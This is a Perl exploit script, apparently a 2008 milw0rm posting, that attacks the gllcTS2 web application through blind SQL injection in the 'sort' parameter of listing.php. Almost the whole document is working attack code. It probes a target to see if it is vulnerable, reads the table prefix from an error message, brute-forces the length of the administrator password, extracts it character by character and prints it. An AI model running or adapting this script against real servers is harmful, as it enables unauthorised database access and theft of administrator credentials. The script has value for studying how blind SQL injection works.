#!/usr/bin/perl
######################
#
#gllcTS2 (listing.php $sort) Remote Blind SQL Injection Exploit
#
######################
#
#Bug by: h0yt3r
#
##
###
##
#
#This one shows another vulnerability in the gllcTS2. (Thera are many with simple injections)
#Same Versions are affected.
#Also shows the conecpt of how to inject an ORDER BY statement via Blind Injection and
#WITHOUT benchmark(), means we produce an error if the IF statement returns TRUE.
#
#Gr33tz go to:
#b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the neverdying h4ck-y0u Team
#
################
use LWP::UserAgent;
my $userAgent = LWP::UserAgent->new;

usage();

$server = $ARGV[0];
$dir = $ARGV[1];


print"\n";
if (!$dir) { die "Read Usage!\n"; }


$filename ="listing.php";

my $vulnCheck = "http://".$server.$dir.$filename;

my $prefix ="";

my @Daten = ("61","62","63","64","65","66","67","68","69","6A","6B","6C","6D","6E","6F","70","71","72","73","74","75","76","77","78","79","7A","3A","5F","31","32","33","34","35","36","37","38","39","30");

my $Attack= $userAgent->get($vulnCheck);
if ($Attack->is_success)
{
    print "[x]Attacking ".$vulnCheck."\n";
}
else
{
    print "Couldn't connect to ".$vulnCheck."!";
    exit;
}

print "[x]Vulnerable Check:";

my $check = $vulnCheck."?sort='";

my $Attack= $userAgent->get($check);
if($Attack->content =~ m/FROM (.*?)_weblist/i)
{
    print " Vulnerable!\n";    
    $prefix = $1;
}
else
{
    print " Not Vulnerable!";
    exit;
}

my $hex="";
my $length;

print "[x]Bruteforcing Length\n";

my $lengthCounter = 1;
while(1)
{
    #To inject ORDER BY (where we cannot union select) we just have to pass a simple IF statement.
    #Instead of Benchmark() we can use a subquery which, in this case, would return "Subquery returns more than 1 row" if the statement actualle is true.
    my $url = "".$vulnCheck."?sort=IF(LENGTH((select admin_pass from ".$prefix."_admin))=".$lengthCounter.",(select 1 union select 5),null)&direction=desc&showgroup=all";
    my $Attack= $userAgent->get($url);
    my $content = $Attack->content;
    if($content =~ m/Please contact a the site admin immediately./i)
    {        
        $length=$lengthCounter;        
        last;        
    }
    else
    {
        $lengthCounter++;    
    }
}


print "[x]Injecting Black Magic\n";

for($b=1;$b<=$length;$b++)
{
    for(my $u=0;$u<28;$u++)
    {                                                            
        my $url = "".$vulnCheck."?sort=IF(substring((select admin_pass from ".$prefix."_admin),".$b.",1)=0x".$Daten[$u].",(select 1 union select 5),null)&direction=desc&showgroup=all";

        my $Attack= $userAgent->get($url);

        my $content = $Attack->content;        
        
        if($content =~ m/Please contact a the site admin immediately./i)   
        {            
            print "[x]    Found Char ".$Daten[$u]."\n";            
            $hex=$hex.$Daten[$u];
            last;
        }

        else
        {
            #Whatever...            
        }
    }
}

print "[x]Converting \n";
my $a_str = hex_to_ascii($hex);

print "[x]Success! \n";
print "     Adminpassword: $a_str\n";
    
sub hex_to_ascii ($)
{        
        (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
        return $str;
}

sub usage()
{
    print q
    {
    ######################################################
              gllcTS2 Remote Blind SQL Injection Exploit            
                         -Written  by h0yt3r-                       
    Usage: gllcts2.pl [Server] [Path]
    Sample:
    perl gllcts2.pl www.site.com /cms/
    ######################################################
    };

} 

# milw0rm.com [2008-06-13]
